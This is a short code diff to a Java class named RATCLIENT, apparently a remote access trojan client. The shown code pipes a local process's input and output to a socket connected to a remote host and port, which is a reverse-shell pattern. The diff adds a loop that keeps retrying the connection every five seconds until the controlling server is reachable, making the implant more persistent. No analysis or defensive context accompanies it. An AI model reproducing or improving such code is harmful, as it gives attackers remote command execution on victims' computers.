@@ -2,7 +2,6 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.InetAddress;
 import java.net.Socket;
-
 import java.io.BufferedReader;
 import java.io.IOException;
 
@@ -24,7 +23,16 @@ public class RATCLIENT {
     brIn= new BufferedReader(new InputStreamReader(p.getInputStream()));
     pwProcess = new PrintWriter(p.getOutputStream(),true);
     InetAddress inetaddr = InetAddress.getByName(host);
-    socket = new Socket(inetaddr,port);
+    boolean connected = false;
+    while (!connected) {
+    	try {
+    		socket = new Socket(inetaddr,port);
+    		connected = true;
+    	} catch (IOException e) {
+    		System.out.println("Server Not Ready - Waiting 5 seconds and trying again");
+    		Thread.sleep(5000);
+    	}
+    }
     
     brSocket = new BufferedReader(new InputStreamReader(socket.getInputStream()));
     pwSocket = new PrintWriter(socket.getOutputStream(),true);
